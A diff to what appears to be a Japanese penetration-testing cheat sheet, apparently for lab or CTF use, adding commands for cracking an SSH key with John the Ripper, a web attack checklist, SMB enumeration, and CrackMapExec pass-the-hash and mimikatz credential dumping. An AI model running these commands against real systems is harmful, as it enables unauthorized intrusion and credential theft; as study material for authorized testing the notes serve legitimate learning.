@@ -96,6 +96,13 @@ chmod 600 id_rsa
 ssh -i id_rsa root@10.10.10.1
 ```
 
+### id_rsaのクラック
+```
+ssh2john id_rsa > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+```
+
 ### SMTP(25)
 未完了
 
@@ -137,7 +144,21 @@ kali@kali:~$ dnsenum zonetransfer.me
 
 ## HTTP(80)
 ### チェック項目
-未完了(robots.txtやらいろいろ確認事項を列挙)
+- robots.txtの確認
+- サブドメインの列挙
+- ディレクトリスキャナーの使用
+- CMSの特定
+- ログインの試行
+  - デフォルトパスワードの入力
+  - パスワード推測
+  - SQLインジェクションの試行
+  - Webサイト上にある情報からユーザー/パスワードリストの作成
+  - ブルートフォース
+- BurpSuiteを用いてWebの挙動の確認
+- URLを見て、LFIの脆弱性が無いか確認
+- upload機構がある場合、バイパス方法の模索
+- 掲載されている画像にヒントが無いか確認
+
 
 ### robots.txtの確認
 ```
@@ -164,11 +185,14 @@ gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.
 - -s...ステータスコードの指定
 
 ### ffuf
-*追記予定
 ```
 Directory Fuzzing:
 ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -o <outputfile>
 ```
+- -c...出力をカラーにする
+- -w...wordlistの指定
+- -u...ターゲットURLの指定
+- -o...結果をファイルに出力
 
 ### Nikto
 ```
@@ -378,17 +402,21 @@ jenny joe45 john marcus ryuu
 ### smbclient
 匿名ログインが有効になっているかの確認。
 ```
-smbclient -L <target ip>
+smbclient -L 10.10.10.1
+smbclient //10.10.10.1/tmp
 ```
 
 ### impacket
 ネットワークプロトコルを操作するためにPythonクラスのコレクション。  
 SMB1-3やMSRPCなどのプロトコル実装自体を提供することに重点を置いている。  
 ツールを利用する以外にもよくexploitに使われているので、インストールしておく必要がある。
-
 ```
 git clone https://github.com/SecureAuthCorp/impacket.git
 pip install .
+```
+#### impacket-smbclient
+```
+/usr/share/doc/python3-impacket/examples/smbclient.py username@10.10.10.1
 ```
 
 #### impacket-smbserver
@@ -397,15 +425,34 @@ pip install .
 ```
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp <共有するディレクトリ>
 ```
-
 ```
 C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
+```
+
+#### RPCclient
+```
+rpcclient -U "" -N 10.10.10.1
+```
+
+#### CrackMapExec
+```
+crackmapexec smb -L 
+crackmapexec 10.10.10.1 -u Administrator -H [hash] --local-auth
+crackmapexec 10.10.10.1 -u Administrator -H [hash] --share
+crackmapexec smb 10.10.10.1/24 -u user -p 'Password' --local-auth -M mimikatz
+```
+
+### nmap-smb
+```
+nmap --script smb-* -p 139,445, 10.10.10.1
+nmap --script smb-enum-* -p 139,445, 10.10.10.1
 ```
 
 ### smbmap
 ドメイン全体のsamba共有ドライブを列挙するために使用。
 ```
-smbmap -u <username> -p <password> -H <target host ip>
+smbmap -u <user> -p <password> -H 10.10.10.1
+smbmap -H 10.10.10.1 -d <domain> -u <user> -p <password>
 ```
 
 ### enum4linux
@@ -458,6 +505,9 @@ create user <追加するusername>@<host name> IDENTIFIED BY <password>;
 ```
 grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <password>;
 ```
+
+## Redis(6379)
+未完了
 
 # Exploitation
 ## Reverse Shell
